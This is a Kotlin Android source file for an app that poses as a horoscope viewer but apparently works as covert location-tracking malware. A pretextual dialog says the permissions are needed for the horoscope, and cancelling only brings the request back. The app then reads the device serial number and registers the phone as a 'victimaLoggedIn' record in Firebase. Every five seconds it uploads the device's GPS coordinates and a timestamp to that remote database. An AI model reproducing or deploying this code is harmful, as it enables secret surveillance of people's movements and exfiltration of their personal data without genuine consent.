package com.sihe.horoscopo

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.telephony.TelephonyManager
import android.util.Log
import android.location.Location
import android.location.LocationManager
import android.os.Handler
import android.os.Looper
import android.widget.Button
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import com.google.android.gms.location.*
import com.google.firebase.firestore.SetOptions
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import java.text.SimpleDateFormat

class MainActivity : AppCompatActivity() {

    private var SERIALNO : String = ""
    private var DEVICE : String = ""
    private val TAG = "ClassName"
    lateinit var mFusedLocationClient: FusedLocationProviderClient
    var lat: String = ""
    var long: String = ""
    var time: String = ""

    private val db = Firebase.firestore

    val PERMISSION_ALL = 1
    val PERMISSIONS = arrayOf(android.Manifest.permission.READ_PHONE_STATE, android.Manifest.permission.CAMERA, android.Manifest.permission.ACCESS_FINE_LOCATION)


    @RequiresApi(Build.VERSION_CODES.M)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

        val mClickButton = findViewById<Button>(R.id.button)
        val mClickButton2 = findViewById<Button>(R.id.button2)
        val mClickButton3 = findViewById<Button>(R.id.button3)
        val mClickButton4 = findViewById<Button>(R.id.button4)
        val mClickButton5 = findViewById<Button>(R.id.button5)

        mClickButton.setOnClickListener {
            Toast.makeText(this@MainActivity, "Las estrellas y los planetas no afectarán tu vida en ningún modo, esto es una estafa", Toast.LENGTH_SHORT).show()
        }
        mClickButton2.setOnClickListener {
            Toast.makeText(this@MainActivity, "Las estrellas y los planetas no afectarán tu vida en ningún modo, esto es una estafa", Toast.LENGTH_SHORT).show()
        }
        mClickButton3.setOnClickListener {
            Toast.makeText(this@MainActivity, "Las estrellas y los planetas no afectarán tu vida en ningún modo, esto es una estafa", Toast.LENGTH_SHORT).show()
        }
        mClickButton4.setOnClickListener {
            Toast.makeText(this@MainActivity, "Las estrellas y los planetas no afectarán tu vida en ningún modo, esto es una estafa", Toast.LENGTH_SHORT).show()
        }
        mClickButton5.setOnClickListener {
            finish()
        }

        if (!hasPermissions(this, *PERMISSIONS)){
            permissionExplanation()
        } else {
            startLocationService()
        }

    }

    fun startLocationService(){
        DEVICE = android.os.Build.MODEL
        SERIALNO = getSerialNumber()
        val location = hashMapOf(
            "location" to "victimaLoggedIn"
        )

        db.collection("devices").document(SERIALNO)
            .set(location, SetOptions.merge())
            .addOnSuccessListener {
                Log.d(
                    TAG,
                    "DocumentSnapshot successfully written!"
                )
            }
            .addOnFailureListener { e -> Log.w(TAG, "Error writing document", e) }

        val mainHandler = Handler(Looper.getMainLooper())
        window.decorView.post {
            mainHandler.post(object : Runnable {
                override fun run() {
                    getLastLocation()
                    saveToFirestore()
                    mainHandler.postDelayed(this, 5000)
                }
            })
        }

    }

    private fun hasPermissions(context: Context?, vararg permissions: String): Boolean {
        if (context != null && permissions != null)
            for (permission in permissions)
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED)
                    return false
        return true
    }

    @SuppressLint("MissingPermission")
    fun getSerialNumber(): String {
        try {
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            // Revisa el API LEVEL ya que algunos métodos están deprecados para ciertas versiones de Android
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                return android.os.Build.getSerial()
            else
                return android.os.Build.SERIAL
        } catch (ex: Exception) {
            Log.e("ERROR: ", ex.message)
            return "ERROR"
        }
    }

    @RequiresApi(Build.VERSION_CODES.M)
    fun permissionExplanation() {
        var ans = false
        val builder = AlertDialog.Builder(this)
        builder.setTitle("Conceder permiso")
        builder.setMessage("La aplicación necesita los permisos para obtener tu horoscopo")
        builder.setPositiveButton("ACEPTAR") { dialog, which ->
            dialog.cancel()
            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL)
        }
        builder.setNegativeButton("CANCELAR") { dialog, which ->
            dialog.cancel()
            permissionExplanation()
        }
        builder.show()
    }

    fun printToast(txt: String) {
        Toast.makeText(this, txt, Toast.LENGTH_LONG).show()
    }

    private fun saveToFirestore(){
        var numRecords = 0
        val docRef = db.collection("devices").document(SERIALNO)
        docRef.get()
            .addOnSuccessListener { document ->
                if (document != null) {
                    Log.d(TAG, "DocumentSnapshot data: ${document.data}")
                    numRecords = document.data?.size!!
                    val location = hashMapOf(
                        (numRecords + 1).toString() to "$lat;$long;$time"
                    )

                    db.collection("devices").document(SERIALNO)
                        .set(location, SetOptions.merge())
                        .addOnSuccessListener {
                            Log.d(
                                TAG,
                                "DocumentSnapshot successfully written!"
                            )
                        }
                        .addOnFailureListener { e -> Log.w(TAG, "Error writing document", e) }

                } else {
                    Log.d(TAG, "No such document")
                }
            }
            .addOnFailureListener { exception ->
                Log.d(TAG, "get failed with ", exception)
            }
    }

    @SuppressLint("MissingPermission")
    private fun getLastLocation() {
        if (isLocationEnabled()) {

            mFusedLocationClient.lastLocation.addOnCompleteListener(this) { task ->
                var location: Location? = task.result
                if (location == null) {
                    requestNewLocationData()
                } else {
                    lat = location.latitude.toString()
                    long = location.longitude.toString()
                    time = SimpleDateFormat("yyyyMMdd_HHmmss").format(java.util.Date())
                }
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun requestNewLocationData() {
        var mLocationRequest = LocationRequest()
        mLocationRequest.priority = LocationRequest.PRIORITY_HIGH_ACCURACY
        mLocationRequest.interval = 0
        mLocationRequest.fastestInterval = 0
        mLocationRequest.numUpdates = 1

        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        mFusedLocationClient!!.requestLocationUpdates(
            mLocationRequest, mLocationCallback,
            Looper.myLooper()
        )
    }

    private val mLocationCallback = object : LocationCallback() {
        override fun onLocationResult(locationResult: LocationResult) {
            var mLastLocation: Location = locationResult.lastLocation
            mLastLocation.latitude.toString()
            mLastLocation.longitude.toString()
        }
    }

    private fun isLocationEnabled(): Boolean {
        var locationManager: LocationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) || locationManager.isProviderEnabled(
            LocationManager.NETWORK_PROVIDER
        )
    }

}
